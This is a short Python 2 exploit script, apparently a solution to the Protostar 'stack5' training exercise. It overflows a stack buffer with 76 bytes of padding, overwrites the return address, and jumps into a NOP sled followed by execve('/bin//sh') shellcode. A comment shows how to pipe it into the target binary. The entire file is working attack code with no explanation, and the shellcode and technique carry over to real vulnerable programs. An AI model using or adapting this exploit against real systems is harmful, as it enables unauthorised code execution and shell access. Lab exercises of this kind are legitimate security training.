import struct
padding = "A" * 76
ret = struct.pack("I",0xbffff79c + 30)
nopslide = "\x90" * 120
shellcode =  "\x31\xc0\x50\x68\x2f\x2f\x73"
shellcode += "\x68\x68\x2f\x62\x69\x6e\x89"
shellcode += "\xe3\x89\xc1\x89\xc2\xb0\x0b"
shellcode += "\xcd\x80\x31\xc0\x40\xcd\x80"

exploit = padding + ret + nopslide + shellcode
print exploit + "\n"
#(python stack5.py; cat) | /opt/protostar/bin/stack5
